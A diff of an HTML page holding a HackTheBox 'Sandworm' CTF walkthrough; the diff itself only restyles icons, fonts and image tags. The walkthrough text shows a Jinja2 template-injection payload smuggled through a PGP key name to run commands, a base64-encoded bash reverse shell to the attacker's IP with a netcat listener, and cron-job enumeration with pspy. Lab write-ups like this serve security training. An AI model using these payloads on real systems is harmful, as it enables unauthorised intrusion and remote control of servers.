@@ -5,58 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sandworm - HTB</title>
     <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"></noscript>
     <link href="/css/styles.css" rel="stylesheet">
     <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <button class="sidebar-toggle" id="sidebarToggle"><i class="bi bi-list"></i></button>
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
             <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <img width="160" height="160" src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
+                    <span class="sidebar-role">Red Team Database</span>
                 </div>
                 <nav>
                     <ul class="nav-menu">   
                         <li class="nav-item">
                             <a href="/" class="nav-link">
-                                <i>🏠</i>
+                                <i class="bi bi-house-door"></i>
                                 <span>Home</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/articles" class="nav-link active">
-                                <i>📝</i>
+                                <i class="bi bi-journal-code"></i>
                                 <span>Articles</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/writeups" class="nav-link">
-                                <i>💻</i>
+                                <i class="bi bi-terminal"></i>
                                 <span>WriteUps</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/notes" class="nav-link">
-                                <i>📚</i>
+                                <i class="bi bi-folder2-open"></i>
                                 <span>Notes</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
-                                <i>⚡</i>
+                                <i class="bi bi-bug"></i>
                                 <span>KL-Sunset</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/about" class="nav-link">
-                                <i>👤</i>
+                                <i class="bi bi-person-badge"></i>
                                 <span>About me</span>
                             </a>
                         </li>
@@ -68,7 +72,7 @@
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img src="/writeups/htb/medium/sandworm/img/sandworm.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <img src="/writeups/htb/medium/sandworm/img/sandworm.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=elswix'">
                     <h2>Sandworm - HTB</h2>
                     <p>walkthrough by elswixHackTheBox</p>
                 </section>
@@ -147,30 +151,30 @@ Making use of <code>openssl</code>, we can examine the SSL certificate on port 4
 While there may not be immediately intriguing information, it's worth noting a potential user named <code>atlas</code>.<br/><br/>
 <h3><br/>Web Application</h3><br/>
 Upon accessing the website through our browser, we will see the following content:<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/1.png"><br/><br/>
+<img width="1343" height="574" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/1.png"><br/><br/>
 Upon entering the <code>contact</code> section, we encounter information related to PGP messages:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/2.png"><br/><br/>
+<img width="1171" height="463" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/2.png"><br/><br/>
 A message with a hyperlink redirects us to the following page:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/4.png"/><br/><br/>
+<img width="1343" height="578" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/4.png"/><br/><br/>
 <h3><br/>PGP</h3><br/>
 <em>PGP (Pretty Good Privacy) is a software program developed by Phil Zimmermann in 1991, providing public-key cryptography for secure data communication. It uses a pair of keys, public and private, for encrypting and decrypting information. PGP is commonly used for encrypting emails and files. It ensures privacy by allowing users to share their public keys for encryption and maintain the secrecy of their private keys for decryption. Additionally, PGP supports digital signatures for verifying data integrity, making it a widely adopted standard for digital communication security.</em><br><br/>
 This web application provides functionality for encrypting, decrypting, and validating the signing of PGP messages. Let's explore its features.<br/><br/>
 To begin, there is a section dedicated to decrypting messages:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/5.png"/><br/><br/>
+<img width="1171" height="410" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/5.png"/><br/><br/>
 In the encrypted text field, we need to input the PGP-encrypted message. To do this, we require the PGP Public Key associated with the encryption. Let's proceed to locate the key.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/6.png"/><br/><br/>
+<img width="701" height="153" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/6.png"/><br/><br/>
 On the same page, there is a reference to where we can obtain the public key. Clicking on the hyperlink redirects us to the <code>/pgp</code> section:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/7.png"/><br/><br/>
+<img width="1335" height="579" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/7.png"/><br/><br/>
 Here, we have the PGP Public key, and I will copy it to my clipboard.<br/><br/>
 In my search for online PGP encrypters, I came across this <a href="https://8gwifi.org/pgpencdec.jsp">page</a> which allows us to encrypt any message by specifying a public key.<br/><br/>
 As an example, let's encrypt the message <code>Hello World</code>.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/8.png"/><br/><br/>
+<img width="757" height="373" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/8.png"/><br/><br/>
 Here is the encrypted <code>Hello World</code> message using the provided Public Key:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/9.png"/><br/><br/>
+<img width="748" height="292" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/9.png"/><br/><br/>
 Once copied, let's paste it into the <code>Encrypted Text</code> field:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/10.png"/><br/><br/>
+<img width="1173" height="454" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/10.png"/><br/><br/>
 Upon clicking on <code>Decrypt Message</code>, the application returns the plaintext message:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/11.png"/><br/><br/>
+<img width="1165" height="433" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/11.png"/><br/><br/>
 Given our knowledge that this website employs Flask in the backend and considering that older versions of Flask are susceptible to Server Side Template Injection (SSTI), we can attempt some payloads to validate this potential vulnerability.<br/><br/>
 Utilizing the same Public Key, I will encrypt the following payload obtained from <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks</a>:<br/><br/>
 <div class="highlight"><pre><span></span><span class="err">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}}</span>
@@ -180,20 +184,20 @@ Utilizing the same Public Key, I will encrypt the following payload obtained fro
 <span class="o">#</span><span class="err">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}</span>
 <span class="o">*</span><span class="err">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="err">}</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/13.png"/><br/><br/>
+<img width="776" height="382" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/13.png"/><br/><br/>
 Now, let's input the PGP-encrypted message into the <code>Encrypted Text</code> field:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/14.png"/><br/><br/>
+<img width="1203" height="346" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/14.png"/><br/><br/>
 It seems that the attempt to input the SSTI PGP-encrypted message was unsuccessful. Consequently, the encryption and decryption functionality may not be exploitable at this point.<br/><br/>
 <h3><br/>Verifying signed messages</h3><br/>
 Verifying the signature of messages involves confirming their authenticity and integrity by checking a digital signature created with a private key against the corresponding public key. This ensures that the message hasn't been tampered with and originates from the holder of the private key.<br><br/>
 At the bottom of the page, there is an illustrative example:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/15.png"/><br/><br/>
+<img width="896" height="436" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/15.png"/><br/><br/>
 Let's copy this message and input it into the <code>Signed Text</code> field:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/16.png"/><br/><br/>
+<img width="1223" height="414" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/16.png"/><br/><br/>
 Additionally, we require the public key associated with the message. Let's copy it from the <code>/pgp</code> section:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/17.png"/><br/><br/>
+<img width="1195" height="406" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/17.png"/><br/><br/>
 Upon clicking on <code>Verify Signature</code>, the application displays the following message:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/19.png"/><br/><br/>
+<img width="485" height="461" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/19.png"/><br/><br/>
 Before testing the signing functionality on the page using the <code>gpg</code> tool, we need to create some keys:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
 <span class="n">gpg</span> <span class="p">(</span><span class="n">GnuPG</span><span class="p">)</span> <span class="mf">2.2.40</span><span class="p">;</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2022</span> <span class="n">g10</span> <span class="n">Code</span> <span class="n">GmbH</span>
@@ -303,9 +307,9 @@ Now, we can read the public key:<br/><br/>
 </pre></div>
 
 Let's populate the fields with the respective information.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/20.png"/><br/><br/>
+<img width="1209" height="406" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/20.png"/><br/><br/>
 Upon clicking on <code>Verify Signature</code>, the application displays the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/21.png"/><br/><br/>
+<img width="494" height="465" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/21.png"/><br/><br/>
 It's evident that the <code>Email</code> and the <code>Real Name</code> specified during key generation are reflected in this message. Let's attempt the Server-Side Template Injection (SSTI) once again.<br/><br/>
 I will create new keys, specifying <code>{{7*7}}</code> as the Real Name and <code>elswix1@elswix.com</code> as the Email:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span>
@@ -350,9 +354,9 @@ Now, let's export the new Public Key:<br/><br/>
 </pre></div>
 
 Now let's fill in the fields:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/22.png"/><br/><br/>
+<img width="1224" height="429" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/22.png"/><br/><br/>
 Upon clicking <code>Verify Signature</code>, it becomes apparent that we have successfully exploited an SSTI:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/23.png"/><br/><br/>
+<img width="496" height="447" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/23.png"/><br/><br/>
 The mathematical operation (<code>{{7*7}}</code>) was interpreted and returned 49.<br/><br/>
 In <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution">PayloadsAllTheThings</a>, there are payloads for achieving Remote Command Execution using <code>Jinja2</code>. I will use the following payload:<br/><br/>
 <div class="highlight"><pre><span></span><span class="p">{{</span> <span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
@@ -399,9 +403,9 @@ Then, let's sign the same message again:<br/><br/>
 Don't forget to export the new public key:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">export</span> <span class="o">--</span><span class="n">armor</span> <span class="n">elswix2</span><span class="nd">@elswix</span><span class="o">.</span><span class="n">com</span> <span class="o">&gt;</span> <span class="n">public_key</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/24.png"/><br/><br/>
+<img width="1149" height="393" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/24.png"/><br/><br/>
 Upon clicking on <code>Verify Signature</code>, the page displays the following content:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/25.png"/><br/><br/>
+<img width="479" height="412" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/25.png"/><br/><br/>
 We're now executing system-level commands on the victim machine by exploiting the SSTI vulnerability.<br/><br/>
 Executing commands in this manner can be cumbersome, so let's send a reverse shell. Given that the standard bash reverse shell contains numerous special characters, I will encode the payload in base64:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.7/3001 0&gt;&amp;1'</span> <span class="o">|</span> <span class="n">base64</span>
@@ -447,7 +451,7 @@ Before sending the information, let's set up our netcat (nc) listener on port 30
 </pre></div>
 
 Now, with the information entered, let's click on <code>Verify Signature</code><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/26.png"/><br/><br/>
+<img width="1177" height="391" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/26.png"/><br/><br/>
 Finally, we have obtained the reverse shell:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
@@ -761,7 +765,7 @@ It is also a Rust project, but in this case, we have write privileges:<br/><br/>
 
 Now, I will look for tasks being executed by other users. To achieve this, I will utilize <a href="https://github.com/DominicBreuker/pspy">pspy</a>. I downloaded the <code>pspy64</code> release version and uploaded it to the victim machine.<br/><br/>
 After waiting patiently, a cron job was executed:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/sandworm/img/27.png"/>
+<img width="1316" height="473" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/sandworm/img/27.png"/>
 The user "atlas" is compiling the Rust project <code>tipnet</code> using Cargo. Let's explore how we can exploit this to gain access as "atlas."<br/><br/>
 Upon inspecting the source code of <code>tipnet</code>, it was discovered that <code>logger</code> is being executed:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">silentobserver@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">src</span><span class="err">$</span> <span class="n">cat</span> <span class="n">main</span><span class="o">.</span><span class="n">rs</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">logger</span>
